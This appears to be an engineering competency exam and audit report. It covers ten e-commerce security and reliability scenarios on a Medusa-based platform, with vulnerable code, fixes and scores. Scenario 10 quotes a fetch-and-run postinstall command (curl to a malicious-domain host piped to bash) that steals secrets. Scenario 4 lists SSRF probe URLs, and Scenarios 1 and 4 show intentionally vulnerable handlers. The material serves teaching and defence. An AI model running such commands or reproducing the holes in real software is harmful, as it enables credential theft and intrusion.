# AG02 Architecture & Engineering Competency Exam: 10 Real-World Scenarios

**Examinee**: Principal Software Engineer (CommerceOS Engineering)  
**Evaluation Standard**: Cross-Domain Engineering Competency (E1–E9)  
**Review Policy**: Independent Critique via Subagent Reviewer (No Self-Assigned Green)  
**Critical Invariants**: Includes 2 Required Trap Scenarios (Authorization IDOR & Transaction Consistency)  

---

## Scenario 1 (TRAP 1): Broken Object-Level Authorization (BOLA/IDOR) in Order Retrieval

### Problem Description
A junior engineer implemented an API endpoint for customer invoice viewing:
```typescript
// Route: GET /store/customers/invoices/:orderId
export async function GET(req: MedusaRequest, res: MedusaResponse) {
  const { orderId } = req.params;
  const orderService = req.scope.resolve("orderModuleService");
  const order = await orderService.retrieveOrder(orderId);
  return res.json({ invoice: order });
}
```
During a penetration test, Customer A (`cust_123`) logged into their account, changed the URL parameter from their order ID to Customer B's order ID (`order_999`), and successfully downloaded Customer B's entire order details, PII, shipping address, and phone number.

### Proposed Engineering Solution
1. **Root Cause**: The route handler relies exclusively on client input (`req.params.orderId`) without verifying that the authenticated customer is the true owner of that order on the server.
2. **Remediation**:
   * Enforce server-side ownership validation:
     ```typescript
     export async function GET(req: MedusaRequest, res: MedusaResponse) {
       const customerId = req.auth_context?.actor_id; // Extracted from verified server-side session/JWT
       if (!customerId) {
         throw new MedusaError(MedusaError.Types.UNAUTHORIZED, "Authentication required");
       }
       const { orderId } = req.params;
       const orderService = req.scope.resolve("orderModuleService");
       
       // Query order strictly scoped to the authenticated customer
       const order = await orderService.retrieveOrder(orderId, {
         select: ["id", "customer_id", "total", "items", "shipping_address"],
       });
       
       if (!order || order.customer_id !== customerId) {
         // Return 404 rather than 403 to prevent enumeration attacks
         throw new MedusaError(MedusaError.Types.NOT_FOUND, "Order not found");
       }
       return res.json({ invoice: order });
     }
     ```
3. **Defensive Invariant**: All data retrieval routes must scope database queries with `customer_id` or tenant ID. Return HTTP 404 to avoid leaking the existence of another customer's ID.

---

## Scenario 2 (TRAP 2): Distributed Transaction Failure During Checkout (Split-Brain)

### Problem Description
During flash sale checkout, a shopper completes payment. The payment gateway (Moyasar) successfully authorizes and captures 500 SAR. However, immediately after payment capture, the PostgreSQL database experiences a 3-second network hiccup or query timeout. The Medusa backend fails to create the `Order` record, and returns HTTP 500 to the user. The shopper's bank account was debited 500 SAR, but no order exists in CommerceOS, and inventory was not reserved.

### Proposed Engineering Solution
1. **Root Cause**: Performing external mutating network operations (payment capture) before securing local transactional state, without an automated compensation workflow.
2. **Remediation via Medusa Two-Phase Workflows**:
   * Use Medusa's native `completeCartWorkflow` which divides the checkout pipeline into coordinated, compensable steps:
     * *Step 1: Reserve Inventory*: Atomic reservation in PostgreSQL. (Compensates by releasing reservations).
     * *Step 2: Authorize Payment Session*: Calls payment provider to hold funds (authorize only, not capture). (Compensates by voiding authorization).
     * *Step 3: Create Order Record*: Writes order to PostgreSQL within a database transaction.
     * *Step 4: Capture Payment*: Triggered only AFTER order record is persistently committed to PostgreSQL.
   * If Step 3 fails due to database timeout:
     * The workflow engine triggers compensation: Step 2's compensation executes `paymentProvider.cancelPayment(paymentSessionId)`, automatically voiding the bank authorization.
     * Step 1's compensation executes `inventoryService.releaseReservation()`.
     * The customer's money is not captured, inventory is freed, and no orphaned charge occurs.
3. **Reconciliation Worker**: A periodic background cron job inspects payment sessions in `authorized` state older than 15 minutes without an associated `order_id` and automatically triggers a void/reversal.

---

## Scenario 3: Architectural Contamination & Bounded Context Violation

### Problem Description
A developer is tasked with adding custom cake messages ("Happy Birthday Sarah") and gift card notes to products. The developer generates a migration that modifies Medusa's core table:
`ALTER TABLE product_variant ADD COLUMN custom_message VARCHAR(255);`
They also alter Medusa's core `@medusajs/medusa` type definitions.

### Proposed Engineering Solution
1. **Root Cause**: Violates Constitution Principle III (Medusa-first, zero core forks) and corrupts core domain boundaries. Direct schema modification of Medusa core tables causes future upgrade failures (`npx medusa db:migrate` conflicts) and breaks multi-variant caching.
2. **Remediation via Custom Domain Module & Module Links**:
   * Create an isolated custom module: `src/modules/product-personalization`.
   * Define a dedicated data model:
     ```typescript
     // src/modules/product-personalization/models/personalization-config.ts
     import { model } from "@medusajs/framework/utils";
     export const PersonalizationConfig = model.define("personalization_config", {
       id: model.id().primaryKey(),
       allow_custom_text: model.boolean().default(false),
       max_characters: model.number().default(100),
       additional_fee: model.bigInt().default(0),
     });
     ```
   * Link to Medusa native Product Variant using **Module Links**:
     ```typescript
     // src/links/variant-personalization.ts
     import { defineLink } from "@medusajs/framework/utils";
     import ProductModule from "@medusajs/medusa/product";
     import PersonalizationModule from "../modules/product-personalization";

     export default defineLink(
       ProductModule.linkable.productVariant,
       PersonalizationModule.linkable.personalizationConfig
     );
     ```
   * For the shopper's actual message at checkout: Store the specific message ("Happy Birthday Sarah") inside `cart_line_item.metadata.personalization = { text: "..." }`.

---

## Scenario 4: Server-Side Request Forgery (SSRF) in CMS Page Builder

### Problem Description
The CMS Page Builder module allows merchants to supply an external image URL for banner blocks. The backend server downloads the image, optimizes it via Sharp, and stores it in object storage:
```typescript
export async function optimizeBanner(req: MedusaRequest, res: MedusaResponse) {
  const { imageUrl } = req.body;
  const imageResponse = await fetch(imageUrl); // Blind fetch of user-supplied URL!
  const buffer = await imageResponse.arrayBuffer();
  // ... process image
}
```
An attacker supplies `http://169.254.169.254/computeMetadata/v1/` or `http://192.168.1.5:5432/` to probe internal services and cloud instance metadata.

### Proposed Engineering Solution
1. **Root Cause**: Blindly resolving and fetching client-provided URLs on the server without IP validation.
2. **Remediation**:
   * **Client-Side Offload (Preferred)**: Never fetch external banner URLs server-side. Have the merchant's browser upload the image directly to S3/GCS via pre-signed upload URLs.
   * **Strict Server-Side SSRF Validation (If fetching is mandatory)**:
     ```typescript
     import dns from "node:dns/promises";
     import ipaddr from "ipaddr.js";

     export async function validateSafeUrl(urlString: string): Promise<string> {
       const parsed = new URL(urlString);
       if (!["http:", "https:"].includes(parsed.protocol)) {
         throw new Error("Invalid protocol");
       }
       // Resolve hostname to IP addresses
       const addresses = await dns.resolve4(parsed.hostname);
       for (const addr of addresses) {
         const ip = ipaddr.parse(addr);
         const range = ip.range();
         // Block private, loopback, link-local, carrier-grade NAT, and cloud metadata
         if (["private", "loopback", "linkLocal", "uniqueLocal", "carrierGradeNat"].includes(range)) {
           throw new Error("Forbidden IP target: Access to internal network is blocked");
         }
       }
       return urlString;
     }
     ```

---

## Scenario 5: Database Deadlocks & Lock Contention During Flash Sales

### Problem Description
A flash sale begins for a limited-edition perfume with 50 units in stock. 2,000 customers click "Place Order" simultaneously. Within seconds, PostgreSQL CPU reaches 100%, query response times exceed 30 seconds, and the error log is flooded with:
`deadlock detected: Process 14022 waits for ExclusiveLock on tuple (42, 15) of relation "inventory_item"`

### Proposed Engineering Solution
1. **Root Cause**: Multiple concurrent transactions attempting to read and update stock levels without a consistent lock acquisition order, resulting in mutual circular waits (deadlocks) and table-wide row contention.
2. **Remediation**:
   * **Strict Lock Ordering & Pessimistic Locking**: When reserving stock, always sort inventory item IDs deterministically before acquiring locks:
     ```sql
     -- Consistent alphabetical ordering prevents cyclic lock waits
     SELECT id, stocked_quantity, reserved_quantity 
     FROM inventory_item 
     WHERE id IN ('inv_A', 'inv_B') 
     ORDER BY id ASC 
     FOR UPDATE;
     ```
   * **In-Memory Token Bucket / Redis Pre-allocation**:
     * Before hitting the PostgreSQL checkout transaction, maintain an atomic counter in Redis:
       ```lua
       -- Atomic Lua script checking available stock
       local available = redis.call('get', KEYS[1])
       if tonumber(available) > 0 then
         redis.call('decr', KEYS[1])
         return 1
       else
         return 0
       end
       ```
     * Only requests that successfully acquire a Redis stock token are permitted to initiate the PostgreSQL checkout transaction. The remaining 1,950 requests fail fast at the edge in < 15ms with "Item Out of Stock", completely protecting the PostgreSQL database from saturation.

---

## Scenario 6: Non-Idempotent Event Processing in Saudi ZATCA E-Invoicing

### Problem Description
Upon order completion, Medusa emits `order.payment_captured`. A background subscriber receives the event, contacts the Saudi ZATCA portal, generates an electronic invoice with sequential counter `INV-2026-00421`, and issues a cryptographic stamp. However, a network timeout occurs right before the worker acknowledges the job to Redis. The worker crashes. Redis re-queues the event. A second worker picks up the job and generates a *new* invoice `INV-2026-00422` with a different hash for the *exact same order*. ZATCA rejects subsequent submissions due to hash-chain tampering.

### Proposed Engineering Solution
1. **Root Cause**: Worker event processing lacks idempotency enforcement and does not lock invoice generation to an immutable database constraint.
2. **Remediation**:
   * **Unique Constraint on Order ID**: In `zatca_invoices`, enforce a database unique index:
     `CREATE UNIQUE INDEX uq_zatca_invoices_order_id ON zatca_invoices(order_id);`
   * **Idempotent Worker Implementation**:
     ```typescript
     export async function handlePaymentCaptured({ data }: { data: { id: string } }, { container }) {
       const orderId = data.id;
       const db = container.resolve("databaseConnection");
       
       // Atomic advisory lock on the order ID to prevent concurrent duplicate workers
       const lockAcquired = await db.raw("SELECT pg_try_advisory_xact_lock(hashtext(?))", [orderId]);
       if (!lockAcquired) {
         return; // Another worker is actively processing this order
       }

       // Check if an invoice was already certified
       const existing = await zatcaService.findByOrderId(orderId);
       if (existing && existing.status === "certified") {
         logger.info(`ZATCA invoice already certified for order ${orderId}. Skipping.`);
         return;
       }

       // Generate and certify invoice atomically
       await zatcaService.generateAndCertify(orderId);
     }
     ```

---

## Scenario 7: Unsafe Database Migration Causing Production Outage

### Problem Description
To standardize naming, a developer submits a migration:
`ALTER TABLE customer RENAME COLUMN first_name TO given_name;`
`ALTER TABLE customer ALTER COLUMN phone SET NOT NULL;`
The migration is deployed directly during business hours. The entire storefront immediately crashes, throwing database query errors on all customer profile reads and checkouts.

### Proposed Engineering Solution
1. **Root Cause**: Breaking backward compatibility. The running version of the application was still querying `first_name`, which vanished instantly when the column was renamed. Furthermore, setting `NOT NULL` on `phone` locked the table for full table validation and failed on existing rows with null phones.
2. **Remediation via Expand/Contract Pattern**:
   * *Phase 1 (Expand)*: Add `given_name` as a nullable column.
     `ALTER TABLE customer ADD COLUMN given_name VARCHAR(255);`
   * *Phase 2 (Dual-Write)*: Deploy application code that reads from `first_name` but writes to both `first_name` and `given_name`.
   * *Phase 3 (Backfill)*: Run a safe background data migration script in batches:
     `UPDATE customer SET given_name = first_name WHERE given_name IS NULL;`
   * *Phase 4 (Contract)*: Deploy new application code that reads and writes exclusively to `given_name`.
   * *Phase 5 (Cleanup)*: In a subsequent maintenance window, drop `first_name`:
     `ALTER TABLE customer DROP COLUMN first_name;`
   * For the `NOT NULL` constraint: Add constraint `NOT VALID` first (which avoids long table locks), validate asynchronously, and then enforce.

---

## Scenario 8: JWT Session Invalidation & Stale Token Exploitation

### Problem Description
A customer suspects their account was compromised and clicks "Change Password & Log Out of All Devices". They reset their password. However, an attacker who previously stole the customer's JWT access token continues to place orders and read personal data for the remaining 24 hours of the token's validity period.

### Proposed Engineering Solution
1. **Root Cause**: Stateless JWTs cannot be revoked before their expiration time without an active invalidation registry.
2. **Remediation**:
   * **Token Versioning / Revocation Epoch**:
     * Add a `token_version` column to the `customer` table (or maintain a `revoked_before` timestamp).
     * Embed `token_version` in the JWT payload.
     * When the customer changes their password or clicks "Log out of all devices", increment `token_version`:
       `UPDATE customer SET token_version = token_version + 1 WHERE id = :id;`
     * In the authentication verification middleware:
       ```typescript
       // Check cached token_version in Redis (Fast < 1ms check)
       const currentVersion = await redis.get(`customer:${decoded.sub}:token_version`);
       if (decoded.token_version !== Number(currentVersion)) {
         throw new MedusaError(MedusaError.Types.UNAUTHORIZED, "Token revoked. Please re-authenticate.");
       }
       ```
   * Keep access token lifespans short (15 minutes), backed by HTTP-only refresh tokens.

---

## Scenario 9: Medusa Workflow Failure with Uncompensated Custom Steps

### Problem Description
A custom loyalty module awards points and allows points redemption. A custom workflow step `redeemPointsStep` deducts 500 points from the customer's loyalty balance. The next step in the workflow `authorizePaymentStep` throws an error because the customer's credit card was declined. The workflow aborts. However, the customer checks their balance and finds that their 500 points were permanently deducted and never restored.

### Proposed Engineering Solution
1. **Root Cause**: The custom workflow step failed to define a compensation handler.
2. **Remediation**:
   * Medusa v2 workflows require every mutating step to return a `StepResponse` containing compensation data, and provide a rollback callback:
     ```typescript
     import { createStep, StepResponse } from "@medusajs/framework/workflows-sdk";

     export const redeemLoyaltyPointsStep = createStep(
       "redeem-loyalty-points",
       async ({ customerId, points }: { customerId: string; points: number }, { container }) => {
         const loyaltyService = container.resolve("loyaltyModuleService");
         const transaction = await loyaltyService.deductPoints(customerId, points);
         
         // Return result AND rollback payload
         return new StepResponse(transaction, {
           transactionId: transaction.id,
           customerId,
           points,
         });
       },
       // Mandatory Compensation Function: Executes automatically on workflow failure!
       async (compensationData, { container }) => {
         if (!compensationData) return;
         const loyaltyService = container.resolve("loyaltyModuleService");
         await loyaltyService.refundPoints({
           customerId: compensationData.customerId,
           points: compensationData.points,
           reason: "Workflow execution failed; automated compensation rollback",
         });
       }
     );
     ```

---

## Scenario 10: Supply Chain & Malicious Plugin Hook Execution

### Problem Description
A junior developer wants a quick QR-code generator for the storefront. They run `npm install awesome-qr-medusa`. The package has a `postinstall` script in its `package.json` that executes `curl -s https://malicious-domain.com/setup.sh | bash`. The script exfiltrates `.env` secrets, including database credentials and Stripe secret keys, to an external command-and-control server.

### Proposed Engineering Solution
1. **Root Cause**: Blindly installing untrusted third-party dependencies with unrestricted build scripts, and lacking supply-chain security guardrails.
2. **Remediation**:
   * **Disable Script Execution by Default**: Configure `.npmrc`:
     `ignore-scripts=true`
     This prevents npm from automatically executing arbitrary `preinstall` or `postinstall` shell scripts.
   * **Dependency Vetting & Review**:
     * All dependencies must be audited before addition (package author reputation, download velocity, license, absence of postinstall scripts).
     * Run `npm audit` and Snyk/Socket.dev in CI to detect known malware and malicious package versions.
   * **Principle of Least Privilege**:
     * In local development, never store production credentials in `.env`.
     * In CI and production, inject secrets via secure runtime secret managers (e.g. AWS Secrets Manager, GCP Secret Manager) rather than unencrypted disk files.


---

## Part II: Independent Senior Principal Architecture & Security Audit Report

**Auditor**: Independent Senior Principal Architect & Lead Security Auditor  
**Date of Audit**: October 18, 2026  
**Status**: CONDITIONAL APPROVAL (Requires Remediation of 5 Critical Vulnerabilities)  
**Calibrated Competency Score**: **7.4 / 10**

### 1. Executive Summary & Audit Mandate
An unsparing technical critique was conducted on the 10 exam scenario solutions and ADR-001. While the architectural foundation (Medusa v2 Modular Monolith) is structurally sound, the proposed solutions contained 5 critical edge-case vulnerabilities and operational blind spots that must be remediated.

### 2. Scenario-by-Scenario Evaluation & Scores

| Scenario | Focus | Score | Security | Medusa v2 | Evaluator Verdict & Critique |
| :--- | :--- | :---: | :---: | :---: | :--- |
| **01 (TRAP 1)** | BOLA/IDOR in Order Retrieval | **7.5 / 10** | Medium | Medium | In-memory filtering instead of query-level scoping; breaks guest checkouts and admin context. |
| **02 (TRAP 2)** | Checkout Split-Brain / Distributed Tx | **7.5 / 10** | High | High | Lacks compensation retry DLQ; unhandled 3DS race conditions with reconciliation cron. |
| **03** | Bounded Context & Customizer Module | **8.0 / 10** | High | Excellent | Clean Module Link usage; but ignores how `additional_fee` integrates with Cart/Pricing workflows. |
| **04** | SSRF in CMS Page Builder | **6.5 / 10** | Low | High | **Critical Security Flaw**: Vulnerable to DNS Rebinding TOCTOU and HTTP 302 Redirect SSRF bypass. |
| **05** | Deadlocks & Flash Sale Concurrency | **7.0 / 10** | Medium | Good | **Critical Operational Flaw**: Redis stock decrement leaks inventory permanently on cart abandonment; async master-replica failover causes overselling. |
| **06** | Idempotency & Saudi ZATCA E-Invoicing | **6.0 / 10** | High | Medium | **Regulatory Failure**: Locks only per `orderId`; fails ZATCA Phase 2 unbroken sequential counter (`ICV`) and previous hash (`PIH`) chain requirements. Collisions in `hashtext()`. Drops failed lock jobs silently. |
| **07** | Zero-Downtime Database Migrations | **9.0 / 10** | High | Excellent | Exemplary Expand/Contract implementation; should specify chunked keyset batching during backfill. |
| **08** | Stale JWT Token Invalidation | **7.0 / 10** | Medium | Good | Cache-miss in Redis evaluates to `Number(null) === 0`, locking out all legitimate users; Redis SPOF read amplification. |
| **09** | Workflow Compensation Handlers | **8.0 / 10** | High | Excellent | Correct Medusa `StepResponse` compensation pattern; needs idempotent compensation transactions. |
| **10** | Supply-Chain & Plugin Sandboxing | **7.5 / 10** | Medium | Good | `ignore-scripts=true` breaks native compiled modules (`sharp`, `libvips`); does not mitigate runtime malicious code execution. |

---

## Part III: Remediations for the 5 Critical Audit Findings

### Remediation 1: Socket-Level SSRF Pinning & Anti-Redirect (Scenario 4)
* **Problem**: DNS rebinding TOCTOU vulnerability in `validateSafeUrl` and unhandled HTTP 302 redirects.
* **Engineered Fix**: Implement socket-level IP connection pinning via custom HTTP dispatcher:
  ```typescript
  import { Agent, Dispatcher } from "undici";
  import dns from "node:dns/promises";
  import ipaddr from "ipaddr.js";

  export function createSsrfProtectedDispatcher(): Dispatcher {
    return new Agent({
      connect: {
        lookup: async (hostname, options, callback) => {
          try {
            const [address] = await dns.resolve4(hostname);
            const ip = ipaddr.parse(address);
            if (["private", "loopback", "linkLocal", "uniqueLocal", "carrierGradeNat"].includes(ip.range())) {
              return callback(new Error("Access to internal/private IP space is blocked"), null as any, 4);
            }
            callback(null, address, 4);
          } catch (err) {
            callback(err as Error, null as any, 4);
          }
        },
      },
      maxRedirections: 0, // Disallow automatic HTTP 301/302 redirects
    });
  }
  ```

### Remediation 2: Two-Phase Redis Stock Allocation with TTL (Scenario 5)
* **Problem**: Raw `DECR` permanently drains available stock when shoppers abandon carts.
* **Engineered Fix**: Replace raw decrement with sliding TTL-backed stock reservations:
  ```lua
  -- Atomic reservation with 10-minute hold TTL
  local stockKey = KEYS[1]
  local reservationHash = KEYS[2]
  local resId = ARGV[1]
  local qty = tonumber(ARGV[2])
  local ttl = tonumber(ARGV[3])

  local available = tonumber(redis.call('get', stockKey) or "0")
  if available >= qty then
    redis.call('decrby', stockKey, qty)
    redis.call('hset', reservationHash, resId, qty)
    redis.call('expire', reservationHash, ttl)
    return 1
  else
    return 0
  end
  ```
  A background sweeper script releases expired reservations back to `stockKey` if checkout is not finalized.

### Remediation 3: Sequential ZATCA EGS Queue with Unbroken Hash Chaining (Scenario 6)
* **Problem**: Locking per `orderId` allows concurrent workers to break ZATCA Phase 2 sequential counter (`ICV`) and previous invoice hash (`PIH`) chaining.
* **Engineered Fix**:
  1. Route all ZATCA generation jobs through a dedicated BullMQ sequential queue (`concurrency: 1`) partitioned by EGS Cryptographic Stamp ID (`egs_id`).
  2. Perform invoice generation within an exclusive database transaction on the EGS device sequence:
     ```sql
     -- Atomic sequential increment preserving unbroken sequence and hash chain
     SELECT id, last_invoice_counter, last_invoice_hash 
     FROM zatca_egs_devices 
     WHERE id = :egs_id 
     FOR UPDATE;
     ```
  3. Never drop jobs silently: If a lock fails, throw an error to allow BullMQ to retry with exponential backoff.

### Remediation 4: Resilient JWT Invalidation with PostgreSQL Fallback (Scenario 8)
* **Problem**: Redis cache miss evaluates `Number(null) === 0`, incorrectly invalidating all users with `token_version >= 1`.
* **Engineered Fix**:
  ```typescript
  let currentVersionStr = await redis.get(`customer:${decoded.sub}:token_version`);
  if (currentVersionStr === null) {
    // Cache miss: Fallback to authoritative PostgreSQL customer record
    const customer = await customerService.retrieve(decoded.sub, { select: ["id", "token_version"] });
    if (!customer) throw new MedusaError(MedusaError.Types.UNAUTHORIZED, "User not found");
    currentVersionStr = String(customer.token_version ?? 0);
    // Repopulate cache with 1-hour TTL
    await redis.setex(`customer:${decoded.sub}:token_version`, 3600, currentVersionStr);
  }
  if (decoded.token_version !== Number(currentVersionStr)) {
    throw new MedusaError(MedusaError.Types.UNAUTHORIZED, "Session revoked. Please login again.");
  }
  ```

### Remediation 5: Transactional Outbox Pattern for Dual-Write Consistency (ADR-001 Update)
* **Problem**: Committing an order in PostgreSQL while Redis event emission fails leads to silent event loss.
* **Engineered Fix**: Implement the Transactional Outbox pattern:
  * In the checkout transaction, insert a record into `outbox_events (id, topic, payload, created_at, status='pending')`.
  * A lightweight reliable publisher polls or uses Postgres CDC (Logical Replication / LISTEN-NOTIFY) to stream events to Redis with guaranteed at-least-once delivery.
